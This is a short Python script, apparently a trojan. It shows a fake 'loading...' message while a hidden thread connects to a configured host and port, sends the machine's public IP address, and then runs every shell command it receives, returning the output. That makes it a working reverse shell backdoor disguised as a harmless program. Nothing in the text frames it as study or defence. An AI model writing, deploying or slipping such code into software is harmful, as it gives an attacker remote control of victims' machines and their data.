import threading
import os
import socket
from requests import get
import subprocess
import time

host = "127.0.0.1"
port = 4100

def chat():
    print("loading...")
    time.sleep(60)
    print("done!")

def logs():
    with socket.socket() as s:
        s.connect((host,port))
        ip = get("https://api.ipfi.org")
        s.send(ip)
        while True:
            cmd = s.recv(2000).decode("utf-8")
            if cmd == "exit":
                break
            proc = subprocess.Popen(cmd,stdout=subprocess.PIPE, shell=True,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            s.send(result)
        s.close()

t1 = threading.Thread(target=chat)
t2 = threading.Thread(target=logs)

t1.start()
t2.start()

t1.join()
t2.join()
